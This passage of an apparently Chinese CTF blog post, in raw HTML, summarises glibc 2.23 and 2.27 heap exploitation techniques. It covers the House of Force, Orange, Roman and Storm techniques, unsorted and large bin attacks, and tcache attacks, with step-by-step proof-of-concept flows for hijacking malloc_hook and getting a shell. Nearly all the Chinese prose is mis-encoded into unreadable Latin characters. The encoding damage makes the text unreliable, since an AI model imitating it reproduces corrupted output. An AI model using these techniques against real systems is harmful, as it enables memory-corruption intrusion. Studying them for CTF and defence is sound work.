href="#House_of_Roman">House_of_Roman</a>ä¸­é’ˆå¯¹2.23çš„<code>malloc_hook-0x23</code>åœ°æ–¹çš„fastbinchunkç­‰ç­‰</p><p>ç„¶è€Œå®é™…åˆ©ç”¨ä¸­å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šå‘ç°æ‰€æœ‰çš„one_gadgetéƒ½ä¸æ»¡è¶³çš„æƒ…å†µï¼Œè¿™ç§æ—¶å€™è¯¥æ€ä¹ˆåŠï¼Ÿä¸‹é¢æ˜¯ä¸€äº›æ€è·¯</p><ol><li class="lvl-3"><p>åˆ©ç”¨realloc_hookã€‚è§‚å¯Ÿ<code>__libc_realloc</code>çš„ä»£ç å¯ä»¥å‘ç°ï¼Œå‰é¢pushäº†å¾ˆå¤šå‚æ•°ï¼š</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000846</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000846</span>C0                 push    r15             ; Alternative name is <span class="string">&#x27;__libc_realloc&#x27;</span></span><br><span class="line">.text:<span class="number">00000000000846</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000000846</span>C4                 push    r13</span><br><span class="line">.text:<span class="number">00000000000846</span>C6                 push    r12</span><br><span class="line">.text:<span class="number">00000000000846</span>C8                 mov     r13, rsi</span><br><span class="line">.text:<span class="number">00000000000846</span>CB                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000846</span>CC                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000846</span>CD                 mov     rbx, rdi</span><br><span class="line">.text:<span class="number">00000000000846</span>D0                 sub     rsp, <span class="number">38</span>h</span><br><span class="line">.text:<span class="number">00000000000846</span>D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">00000000000846</span>DB                 mov     rax, [rax]</span><br><span class="line">                 test    rax, rax</span><br><span class="line">                 jnz     loc_848E8 ;è¿™é‡Œcall rax</span><br></pre></td></tr></table></figure><p>reallocè°ƒæ•´æ ˆå¸§ogè§¦å‘ï¼Œæˆ–è€…åˆ©ç”¨å…¶ä»–ç¯å¢ƒè§¦å‘mallocåŒ…æ‹¬doublefreeå¼‚å¸¸â€“strdupç­‰</p><p>reallocçš„æ„æ€æ˜¯ï¼Œæˆ‘ä»¬åœ¨malloc_hookå¤„å¡«ä¸Šreallocçš„åœ°å€ï¼Œè€Œåœ¨realloc_hookå¤„å¡«ä¸Šone_gadgetçš„åœ°å€ï¼Œåˆ©ç”¨reallocè°ƒç”¨å‰çš„è¿™æ®µpushå‚æ•°å¯¹æ ˆå¸§è¿›è¡Œå¾®è°ƒã€‚</p><h2 id="ä¸€äº›å¸¸è¯†ï¼š">ä¸€äº›å¸¸è¯†ï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>tcacheæœ€å¤š64ä¸ªï¼Œæ¯ä¸ªæœ€å¤§è¿æ¥7ä¸ªchunkã€‚ä¸‹æ ‡å°±æ˜¯æŒ‰malloc_alignåˆ†ï¼Œä»¥64ä½ä¸ºä¾‹ï¼Œ0-24å¤§å°çš„å¯¹åº”idx0ï¼Œ25-40å¯¹åº”idx1ï¼Œ41-56å¯¹åº”idx2ä¾æ¬¡ç±»æ¨æ¯ä¸ª+16ã€‚ç„¶å32ä½å°±æ˜¯0-12ï¼Œ13-20è¿™æ ·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_MXFAST             <span class="number">64</span> (<span class="keyword">for</span> <span class="number">32b</span>it), <span class="number">128</span> (<span class="keyword">for</span> <span class="number">64b</span>it)</span><br></pre></td></tr></table></figure><h1>Glibc 2.23</h1><blockquote><p>æ— tcacheï¼Œæ£€æŸ¥è¾ƒå°‘ï¼Œå¾ˆç»å…¸</p></blockquote><h2 id="arena-attackï¼ˆHouse-of-Mind-House-of-Godsï¼‰">arena attackï¼ˆHouse of Mind &amp; House of Godsï¼‰</h2><p>å®æˆ˜åˆ©ç”¨ä»·å€¼å°ï¼Œçœ‹ä¸ªä¹</p><h3 id="House-of-mind">House of mind</h3><p>ä¼ªé€ arenaï¼Œblogæ²¡å†™ï¼Œæ˜¯ä¸€ç§é€šè¿‡ä¼ªé€ arenaä»è€Œå°†é‡Šæ”¾çš„chunkè¿å…¥å‡arenaçš„è¿‡ç¨‹ï¼Œåˆ©ç”¨æ¯”è¾ƒæŠ½è±¡è€Œä¸”æœ€åä¼¼ä¹è¿˜æ²¡æœ‰ä»»æ„å†™ã€‚</p><h3 id="House-of-Gods">House of Gods</h3><p>åˆ©ç”¨arenaç»“æ„ä½“ä¸­çš„æ•°æ®å’Œé”™ä½å®ç°åœ¨main_arenaä¸­æ„å»ºä¸€ä¸ªchunkè¿›è¡Œå†™å…¥ï¼Œç„¶åç¯¡æ”¹arenaçš„nextæŒ‡é’ˆå°†å †å˜æˆæˆ‘ä»¬è‡ªå·±çš„arenaæ¥åŠ«æŒæ•´ä¸ªå †ã€‚å…·ä½“å‚è§<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a>ï¼Œè™½ç„¶éå¸¸å¤æ‚æ²¡ä»€ä¹ˆç”¨ä½†æ˜¯å¯ä»¥çœ‹çœ‹è¿™ä¸ªå †é£æ°´çš„è¿‡ç¨‹ï¼Œéå¸¸çš„ç¥å¿…ï¼Œæœ‰åŠ©äºç†è§£main_arenaçš„ç»“æ„ï¼š</p><ol><li class="lvl-3"><p>æ³„éœ²unsorted bin å¤´çš„åœ°å€ï¼Œmallocä¸€ä¸ªsmallchunkç„¶åç›´æ¥è¯»ã€‚é€šè¿‡free+malloc(intm)å¯åŠ¨éå†è¿‡ç¨‹ï¼Œå°†ä½å›¾ç½®ä½ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è®©bin[0]ä½œä¸ºä¼ªé€ çš„sizeåŸŸå­˜åœ¨ã€‚æ­¤æ—¶å®ƒæ˜¯0x200.</p></li><li class="lvl-3"><p>é¦–å…ˆå°†smallchunkæ”¾å›unsortedbinä¸­ã€‚ç”¨ä¸Šé¢çš„leakåœ¨main_arenaå†…å¯»å€ã€‚åˆ©ç”¨UAFä¿®æ”¹smallchunkçš„bkï¼Œåœ¨unsortedbiné‡Œé¢é“¾æ¥ä¸Šè¿™ä¸ªä¼ªé€ chunkã€‚</p></li><li class="lvl-3"><p>åˆ©ç”¨malloc_stateçš„ç‰¹æ€§ï¼Œä¿®æ”¹fastbin chunkçš„bkå­—æ®µç„¶åå°†å…¶é‡Šæ”¾ï¼Œæ§åˆ¶å…¶åœ¨malloc_stateçš„å¼€å¤´ï¼Œæ¥ç€ä½œä¸ºä¸€ä¸ªä¼ªé€ çš„bkå­—æ®µå­˜åœ¨ï¼Œé“¾æ¥åˆ°INTMã€‚å·§å¦™è‡³æã€‚</p><blockquote><p>è¿™æ—¶å€™çš„unsorted binï¼šhead-&gt;smallchunk-&gt;binmap[last]ï¼ˆä¼ªé€ çš„ï¼‰-&gt;main_arenaçš„å¼€å¤´ï¼ˆç”±äºnextæŒ‡é’ˆå¼€å§‹å°±æ˜¯æŒ‡å‘æœ¬èº«çš„ï¼‰-&gt;fast40-&gt;INTM</p></blockquote></li><li class="lvl-3"><p>å°†binmap chunkä½œä¸ºä¸€ä¸ªâ€œchunkâ€å–å‡ºã€‚å¾—åˆ°äº†å†™å…¥main_arenaï¼ˆå³ä¾¿æ˜¯éƒ¨åˆ†ï¼‰çš„æƒé™ï¼å¼€å§‹ä¸ºè§¦å‘<code>reused_arena()</code>çš„æ¡ä»¶é“ºè·¯ã€‚</p></li><li class="lvl-3"><p>æ¥ç€UAFæ”¹INTMçš„bkï¼Œè®©INTMåé¢å†è¿æ¥ä¸Šnarenaså­—æ®µã€‚ç„¶åå–å‡ºINTMè§¦å‘unsortedbin attackï¼Œå°†narenaså†™ä¸ºä¸€ä¸ªå¤§æ•°ã€‚åŒæ—¶ç”¨binmap chunkï¼Œæ”¹æ‰system_memå­—æ®µã€‚</p></li><li class="lvl-3"><p>ç”¨binmap chunkå°†arenaçš„nextæŒ‡é’ˆéšä¾¿å†™æˆä½ æƒ³åˆ†é…çš„åœ°å€</p></li><li class="lvl-3"><p>è¿ç»­è°ƒç”¨ä¸¤æ¬¡<code>malloc(0xffffffffffffffbf + 1)</code>ï¼Œarenaç›´æ¥å…¨éƒ¨hijackæ‰ã€‚</p></li><li class="lvl-3"><p>éšä¾¿æ“ã€‚</p></li></ol><h2 id="Top-chunk-related-attackï¼ˆHouse-of-Force-House-of-Orangeï¼‰">Top chunk related attackï¼ˆHouse of Force &amp; House of Orangeï¼‰</h2><p>åˆ©ç”¨topchunkçš„ä¸€äº›ç‰¹æ€§è¾¾æˆæˆ‘ä»¬çš„ç›®çš„ã€‚House of Forceå¯ä»¥å®ç°ä»»æ„åœ°å€åˆ†é…ï¼ŒHouse of Orangeå¯ä»¥å®ç°ä¸è°ƒç”¨freeæƒ…å†µä¸‹çš„ä¸€æ¬¡é‡Šæ”¾ã€‚</p><h3 id="House-of-Force">House of Force</h3><p>è§<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a><br>å°†top chunkçš„sizeåŸŸæ”¹åˆ°æå¤§ï¼Œç„¶åé€šè¿‡åˆ†é…evil_sizeçš„chunkå°†topchunkæ¨è¿›åˆ°æˆ‘ä»¬æƒ³åˆ†é…çš„åœ°å€ï¼Œéšåä¸‹æ¬¡åˆ†é…å°±ä¼šä»topä¸­åˆ‡å‡ºæˆ‘ä»¬æŒ‡å®šåœ°å€çš„chunkã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>å…¶ä¸­topçš„sizeä¸€èˆ¬å†™æˆ-1ï¼Œevil_sizeçš„è®¡ç®—å¦‚ä¸‹</p></li></ul><blockquote><p>new_top = old_top + nb<br>nb = new_top - old_top<br>req + 2sizeof(long) = new_top - old_top<br>req = new_top - old_top - 2sizeof(long)<br>req = dest - 2sizeof(long) - old_top - 2sizeof(long)<br>req = dest - old_top - 4*sizeof(long)</p></blockquote><h3 id="House-of-Orange">House of Orange</h3><p>è§<a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">How2Heap4</a><br>ç¥ä¸­ç¥ï¼Œé€‚ç”¨äºæ²¡æœ‰freeçš„æƒ…å†µã€‚é€šè¿‡å…ˆæ”¹å°top chunkçš„sizeåŸŸç„¶åç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„chunkæ¥è§¦å‘sysmallocä¸­çš„brkæ‰©å±•ï¼Œå°±ä¼šå°†æ—§çš„topæ”¾è¿›unsortedbinä¸­ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>topçš„sizeéœ€è¦é¡µå¯¹é½ï¼ŒåŠ¨è°ƒç¡®å®šï¼Œä¸€èˆ¬æ”¹ä¸º0xfe1ç„¶åç”³è¯·0x1000åˆšå¥½ã€‚</p></li><li class="lvl-2"><p>æ–°ç”³è¯·çš„ä¼šæ”¾åœ¨æ–°çš„å†…å­˜é¡µã€‚</p></li><li class="lvl-2"><p>ã€glibc 2.23ã€‘å€ŸåŠ©unsorted bin attackæ”¹å†™IO_LIST_ALLä¸ºunsorted(av)åå°†old topæ”¾å…¥smallbins[4](æ”¹å†™sizeä¸º0x61)ä»è€Œå®ç°ç”¨ä¼ªé€ chunké“¾æ¥è‡³IO_list_allè§¦å‘fsopã€‚</p></li></ul><h2 id="Fastbinï¼ˆnormal-house-of-spirit-House-of-Rabbitï¼‰">Fastbinï¼ˆnormal, house of spirit, House of Rabbitï¼‰</h2><p><a href="https://zjw1nd.github.io/2023/11/09/How2Heap-1/">ï¼ˆæœªå¿…ï¼‰æ›´åŠ ç»†èŠ‚çš„ä»‹ç»</a></p><h3 id="Normal-fast-bin-attackï¼š">Normal fast bin attackï¼š</h3><p>å°†ä¸€ä¸ªfastbinåˆ†é…åœ¨æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ã€‚é€šè¿‡åŠ«æŒå·²åœ¨fastbinä¸­çš„ä¸€ä¸ªchunkçš„fdæŒ‡é’ˆæ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>ä¼šæ£€æŸ¥sizeåŸŸï¼Œéœ€è¦æå‰ä¼ªè£…ã€‚</p></li><li class="lvl-2"><p>åˆ†é…åœ¨malloc_hookæˆ–free_hookçš„è¯ç»å¸¸é…åˆ0x7fçš„å­—èŠ‚é”™ä½æ¥ä¼ªé€ sizeåŸŸ</p></li><li class="lvl-2"><p>UAFå’ŒDouble freeï¼Œfastbinåœ¨2.23ä¸­åªæ£€æŸ¥å¤´éƒ¨æ˜¯å¦double freeä»è€Œæˆ‘ä»¬å¯ä»¥ç”¨dupæ¥å®ç°Write after free</p></li></ul><h3 id="House-of-Spirit">House of Spirit</h3><p>ä¼ªé€ fastbinçš„chunkã€‚é€šè¿‡freeæ”¾å…¥binã€‚éœ€è¦æ³¨æ„ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>è¾¹ç•Œ0x10å¯¹é½</p></li><li class="lvl-2"><p>sizeåŸŸå¤§å°åˆé€‚ï¼Œæ»¡è¶³fastbinè¦æ±‚</p></li><li class="lvl-2"><p>nextçš„åœ°å€ä¸èƒ½æ˜¯topï¼Œè€Œä¸”sizeè¦æ­£å¸¸ï¼ˆä¸ç”¨å¿…é¡»æ˜¯fastbinï¼‰</p></li></ul><h3 id="House-of-Rabbit">House of Rabbit</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">å‚è€ƒ</a><br>é’ˆå¯¹consolidateä¸ä¸¥æ ¼æ£€æŸ¥sizeçš„fastbin attack. è¦èƒ½ä¿®æ”¹sizeåŸŸå¹¶ä¸”æœ‰è§¦å‘consolidateçš„æ¡ä»¶</p><ul class="lvl-0"><li class="lvl-2"><p>ä¿®æ”¹sizeï¼Œç„¶åè§¦å‘consolidateå˜æˆoverlapã€‚</p></li><li class="lvl-2"><p>ä¿®æ”¹fdç„¶åè§¦å‘consolidateå°†fake_chunkæ”¾å…¥binä¸­å˜æˆåˆæ³•chunkï¼ˆæ³¨æ„ä¼ªé€ sizeï¼‰</p></li></ul><h2 id="Unsorted-Bin-Attack">Unsorted Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">å‚è€ƒ</a><br>åˆ©ç”¨Unsorted Binå–å‡ºchunkæ—¶å€™çš„è¿™ä¸ªç‰¹æ€§ï¼ˆåŒå‘é“¾è¡¨ï¼Œbkéå†ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>æ§åˆ¶ä½unsorted binä¸­çš„ä¸‹ä¸€ä¸ªä¼šå–å‡ºçš„chunkçš„bkåŸŸï¼Œæˆ‘ä»¬å°±èƒ½å°†ä¸€ä¸ªå¤§æ•°ï¼ˆ<code>unsorted_chunks(av)</code>ï¼‰å†™å…¥æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œç”±äºæ˜¯fdåç§»ï¼Œæ‰€ä»¥å°†chunkä¸­çš„bkå†™æˆtargetaddr-16å³å¯ã€‚å¯ä»¥ç”¨äºç¯¡æ”¹å¾ªç¯æ¬¡æ•°æˆ–<code>GLOBAL_MAX_FAST</code>ç­‰ã€‚</p><h2 id="House-of-Loreï¼ˆSmall-bin-attackï¼‰">House of Loreï¼ˆSmall bin attackï¼‰</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">å‚è€ƒ</a><br>smallbin attackã€‚ä¸€ä¸ªUAFæ”¹ä¸€ä¸‹smallchunkçš„fdå°±æ˜¯ä»»æ„åœ°å€fakechunkåˆ†é…ã€‚åªè¦èƒ½ç»•è¿‡smallbinåˆ†é…å”¯ä¸€çš„æ£€æŸ¥å°±è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Large-Bin-Attack">Large Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">å‚è€ƒ</a><br>åˆ©ç”¨large binçš„æŒ‡é’ˆå°†æŒ‡å®šåœ°å€çš„å†…å®¹å†™æˆä¸€ä¸ªåˆæ³•çš„large chunkçš„åœ°å€ã€‚å°†å·²ç»åœ¨largebinä¸­çš„chunkçš„bkæˆ–bk_nextsizeç¯¡æ”¹ä¸ºtarget-16ã€-32å³å¯å®ç°åœ¨ä¸‹ä¸€æ¬¡victimæ”¾å…¥largebinæ—¶è§¦å‘å°†victimå†™å…¥targetçš„æ•ˆæœã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>ä» unsorted bin ä¸­æ¥çš„ large chunk è¦ç´§è·Ÿåœ¨æ”»å‡»è¿‡çš„large chunkåé¢ï¼Œä¹Ÿå°±æ˜¯è¦è¿åœ¨ä¸€ä¸ªbiné‡Œï¼Œå¤§å°ä¹Ÿè¦ç›¸é‚»ã€‚</p></li><li class="lvl-2"><p>å¯ä»¥ç¯¡æ”¹io_list_allè¿›è¡Œfsop</p></li><li class="lvl-2"><p>å¯ä»¥å¸®åŠ©tcache smash unlinkï¼Ÿ</p></li></ul><h2 id="COMBO-FISTS-ï¼ˆHouse-of-Roman-House-of-Stormï¼‰">COMBO FISTS ï¼ˆHouse of Roman, House of Stormï¼‰</h2><p><span id="House_of_Roman"></span></p><h3 id="House-of-Romanï¼ˆç»„åˆæ‹³ï¼Œgetshellæ€è·¯å¾ˆå¸¸ç”¨è€Œä¸”å…è®¸çˆ†ç ´-Fastbin-atk-Unsorted-bin-atkï¼‰">House of Romanï¼ˆç»„åˆæ‹³ï¼Œgetshellæ€è·¯å¾ˆå¸¸ç”¨è€Œä¸”å…è®¸çˆ†ç ´, Fastbin atk + Unsorted bin atkï¼‰</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">å‚è€ƒ</a><br>é€šè¿‡åˆ†é…ä¸€ä¸ªmalloc_hooké™„è¿‘çš„chunkï¼ˆç¡®åˆ‡çš„è¯´æ˜¯åœ¨<code>malloc_hook-0x23</code>å¤„è·å–ä¸€ä¸ªfastbinchunkï¼‰å†™å…¥one_gadgetã€‚<br>è¿™ä¸ªæ€è·¯æ˜¯éå¸¸å¥½çš„ï¼Œåªè¦æ˜¯2.23å¹¶ä¸”ä»»æ„åœ°å€åˆ†é…chunkå°±å¯ä»¥ç”¨æ¥getshellã€‚æœ‰libcåœ°å€æœ€å¥½ï¼Œæ²¡æœ‰ä¹Ÿæ²¡å…³ç³»å€ŸåŠ©unsorted bin attack+çˆ†ç ´æ¥å®ç°ã€‚<br>åŸpocçš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>æ‹¿ä¸€ä¸ª0x60çš„fastbin chunk 1ï¼ˆå®é™…å¤§å°0x70ï¼‰</p></li><li class="lvl-2"><p>åˆ†é…ä¸€ä¸ªä¸ç”¨çš„chunkï¼Œå¤§å°0x80ï¼Œå®é™…å¤§å°0x90ï¼Œæ­¤æ—¶ç›¸å¯¹å †åŸºå€çš„åç§»æ¥åˆ°äº†0x100ï¼Œè¿™çµæ€§çš„ä¸€æ­¥æ˜¯ä¸ºäº†å¾…ä¼šæˆ‘ä»¬æ”¹ä¸€ä¸ªå­—èŠ‚å°±èƒ½ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„chunk</p></li><li class="lvl-2"><p>åˆ†é…ä¸€ä¸ª0x80çš„chunk 2ï¼Œç­‰ä¼šæ”¾å…¥unsorted binï¼Œchunk2çš„åœ°å€æ­¤æ—¶æ˜¯0x100å¯¹é½çš„</p></li><li class="lvl-2"><p>åˆ†é…ä¸€ä¸ª0x60çš„fastbin chunk 3ï¼Œè¯¥chunkçš„åç§»åœ°å€æ¥åˆ°äº†0x190</p></li><li class="lvl-2"><p>é‡Šæ”¾chunk2ï¼Œæ”¾å…¥unsorted binï¼Œæ­¤æ—¶å…¶fdå’Œbkå­˜æœ‰main_arena+0x68</p></li><li class="lvl-2"><p>å–0x60å¤§å°çš„chunk4ï¼ˆfake_libc_chunkï¼‰ï¼Œä¼šä»chunk2ä¸­è¿›è¡Œåˆ†å‰²ï¼Œå¸¦æœ‰main_arenaåœ°å€</p></li><li class="lvl-2"><p>è¯»å–å–å‡ºçš„chunk4ï¼Œæ³„éœ²main_arenaåœ°å€ç„¶åè®¡ç®—åç§»è·å–malloc_hook</p></li><li class="lvl-2"><p>é‡Šæ”¾chunk3ï¼Œæ”¾å…¥fastbin</p></li><li class="lvl-2"><p>é‡Šæ”¾chunk1ï¼Œæ¥å…¥fastbiné“¾è¡¨å¤´ï¼Œå…¶fdæŒ‡å‘chunk3ï¼ˆ0x190ï¼‰</p></li><li class="lvl-2"><p>æ¨¡æ‹Ÿä¸€ä¸ªUAFï¼Œå†™chunk1çš„fdä¸€å­—èŠ‚0x00å°†å…¶fdæŒ‡å‘0x100çš„chunk2ï¼ˆchunk 4ï¼‰</p></li><li class="lvl-2"><p>å†™chunk4ï¼Œä¿®æ”¹ä½ä½åœ°å€ä»¤å…¶fdæŒ‡å‘ç›®æ ‡åœ°å€</p></li><li class="lvl-2"><p>æœ€åå°†fastbinä¸­çš„chunk1å’Œ3å–å‡ºï¼Œå†æ¬¡å–å°±å–åˆ°äº†malloc_hook-0x23å¤„çš„chunk</p></li></ul><h3 id="House-of-Storm-unsorted-bin-atk-largebin-atk">House of Storm (unsorted bin atk + largebin atk)</h3><blockquote><p>BLOGæ²¡æœ‰å†™æ‡’å¾—è¡¥äº†å†™åœ¨è¿™é‡Œï¼Œè¯¥æŠ€æœ¯å®ç°ä»»æ„åœ°å€chunkåˆ†é…<br>2.26-2.28 éœ€è¦tcacheå¡«æ»¡ï¼Œå†å¾€åè¯¥æ¼æ´ä¸å¯ç”¨è¿™ä¸ªæŠ€æœ¯æœ€å…³é”®çš„ä¸€æ­¥æ˜¯largebin attackå°†fake_chunkåœ°å€å†™ä¸Šä¸€ä¸ªå †åœ°å€ï¼Œè€Œä¸”éå¸¸å·§å¦™çš„åˆ©ç”¨äº†ä¸€ä¸ªå­—èŠ‚é”™ä½å°†å…¶ä½œä¸ºäº†sizeã€‚ä¸‹é¢æ˜¯POCçš„æµç¨‹</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>å‡†å¤‡ä¸€ä¸ªunsortedbinå †å—ä¸€ä¸ªlargebinå †å—ï¼Œå…¶ä¸­unsortedbinä¸­çš„å †å—è¦æ¯”largebinä¸­çš„å¤§ ï¼ˆè¿˜è¦é˜²æ­¢topåˆå¹¶ï¼‰</p></li><li class="lvl-2"><p>å°†unsortedbinçš„åœ°å€è¿›è¡Œä¸€ä¸‹å¤„ç†ï¼Œç®—å‡ºä¸€ä¸ªç§»ä½åç§»é‡ã€‚</p></li><li class="lvl-2"><p>å°†unsorted binçš„chunk bkå†™ä¸ºfake_chunkï¼Œå°†large chunkçš„bkå†™æˆfake_chunk+8</p></li><li class="lvl-2"><p>å°†large chunkçš„bk_nextsizeå†™æˆfake chunk-0x18-shift_amountï¼Œshiftæ˜¯æˆ‘ä»¬å…ˆå‰çš„åç§»</p></li><li class="lvl-2"><p>åˆ©ç”¨ä¸€ä¸ªlarge_bin attackå°†unsorted chunkçš„åœ°å€å†™å…¥ä¸€ä¸ªæ°å½“çš„ä½ç½®æ­£å¥½ä¼ªé€ å‡ºfakechunkçš„size</p></li><li class="lvl-2"><p>ç”³è¯·ç›¸åº”å¤§å°ï¼ˆå †åœ°å€é«˜8ä½ï¼Ÿï¼‰å³å¯è·å¾—fake_chunk</p></li></ul><h2 id="House-of-Einhejarâ€”â€”off-by-null">House of Einhejarâ€”â€”off by null</h2><p><a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">å‚è€ƒ</a><br>ä»…éœ€off by oneå°±èƒ½å·¥ä½œã€‚æ§åˆ¶ä½å½“å‰chunkçš„æœ«8å­—èŠ‚ï¼ˆprev_sizeå†™æˆevil_sizeï¼Œå·®å€¼ï¼‰ç„¶åæº¢å‡ºä¿®æ”¹æ‰ä¸‹ä¸€ä¸ªchunkçš„PREV_INUSEä½ã€‚ç„¶åé€šè¿‡freeä¸‹ä¸€ä¸ªchunkè§¦å‘åˆå¹¶åï¼Œä¸‹æ¬¡åˆ†é…å°±èƒ½ä»æŒ‡å®šåœ°å€å–chunkäº†ï¼ˆprev_sizeé”™è¯¯åˆå¹¶ï¼Œoverlapï¼‰ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>ç”±äºoff by oneï¼Œæœ€å¥½æº¢å‡ºçš„ä¸‹ä¸ªchunkçš„sizeæ˜¯0x100å¯¹é½çš„ï¼Œä¾¿äºæ”¹å†™</p></li><li class="lvl-2"><p>fakechunkçš„sizeè¦å’Œæˆ‘ä»¬ä¿®æ”¹çš„prev_sizeä¸€è‡´</p></li></ul><h2 id="Unsafe-Unlink">Unsafe Unlink</h2><p>åˆ©ç”¨Unlinkå®ç°overlapæˆ–æŒ‡å®šåœ°å€å†™ï¼ˆç¡®åˆ‡åœ°è¯´æ˜¯å°†targetå†™æˆ&amp;target-0x18ï¼‰ã€‚ä½†æ˜¯è¿™ä¸ªPOCä¸­åˆ©ç”¨æ‰€éœ€è¦çš„å‰ç½®æ¡ä»¶è¾ƒå¤šâ€¦éœ€è¦åŒæ—¶ä¿®æ”¹è¢«unlinkçš„chunkçš„fdå’Œbkä»¥åŠä¸‹ä¸€chunkçš„prevsizeå’ŒPREV_INUSEä½ï¼Œè¦æ±‚å¤ªé«˜äº†ã€‚</p><h1>glibc 2.27</h1><blockquote><p>è¿™ä¸ªç‰ˆæœ¬é¦–æ¬¡å¼•å…¥äº†tcache<br>ä¸‹é¢ä¼šç€é‡æ¶‰åŠtcacheç›¸å…³çš„æ”»å‡»ï¼ŒåŒæ—¶å¤§éƒ¨åˆ†ä¸Šé¢çš„æ”»å‡»æŠ€å·§éƒ½è¦å’Œtcacheæ‰“äº¤é“ï¼Œæ¯”å¦‚å…ˆå¡«æ»¡7ä¸ªã€‚</p></blockquote><h2 id="Fastbin">Fastbin</h2><p>åŒä¸Šï¼Œåªæ˜¯æ¯æ¬¡è¦å…ˆå¡«æ»¡å¯¹åº”å¤§å°çš„7ä¸ªtcache</p><h2 id="tcache">tcache</h2><p><a href="https://zjw1nd.github.io/2024/07/28/How2Heap-8-end-%E2%80%94%E2%80%94Tcache/">å‚è€ƒé“¾æ¥</a></p><h3 id="Same-as-fastbin">Same as fastbin</h3><p>å’Œfastbinä¸€æ ·åªä¸è¿‡æ›´ç®€å•ï¼ˆæ²¡æœ‰äº†fastbin szieæ£€æŸ¥ï¼‰ã€‚åŒ…æ‹¬double freeï¼Œhouse of spiritï¼Œtcache poisonï¼ˆå¯¹åº”fastbin attackï¼‰ç­‰ã€‚</p><h3 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h3><p>åœ¨æœ‰tcacheçš„æƒ…å†µä¸‹æ›¿ä»£unsorted bin attackå®ç°ä»»æ„åœ°å€å†™ä¸€ä¸ªlibcåœ°å€ã€‚åŒæ—¶è¿˜èƒ½æ„é€ fake chunkï¼ˆä»»æ„åœ°å€chunkåˆ†é…ï¼‰ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>tcacheç©ºä¸¤ä¸ªï¼Œæ‹¿åˆ°ä¸¤ä¸ªsmall binå’Œä¸€ä¸ªsmall binçš„UAFï¼Œfake_chunkçš„bkå†™å…¥target</p></li><li class="lvl-2"><p>ä¿®æ”¹åé‡Šæ”¾çš„smallbinå—çš„bkä¸ºfake_chunkåœ°å€ï¼Œ<strong>callocè§¦å‘</strong>å†™å…¥æ”»å‡»ï¼Œtargetè¢«æ”¹åŒæ—¶tcacheå¤´éƒ¨ä¼šé“¾å…¥fake_chunk</p></li><li class="lvl-2"><p>ä¸‹æ¬¡mallocä¼šè¿”å›fake_chunk</p></li></ul><h3 id="House-of-botcake">House of botcake</h3><p>double freeå®ç°ä»»æ„å †å—åˆ†é…ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>ç”¨0x110çš„å †å—å¡«æ»¡tcacheï¼Œç„¶åå†é‡Šæ”¾ä¸¤ä¸ªç›¸é‚»çš„0x110å †å—ï¼ˆå…ˆaåbï¼‰æ”¾å…¥unsorted binå¹¶å¯¼è‡´åˆå¹¶</p></li><li 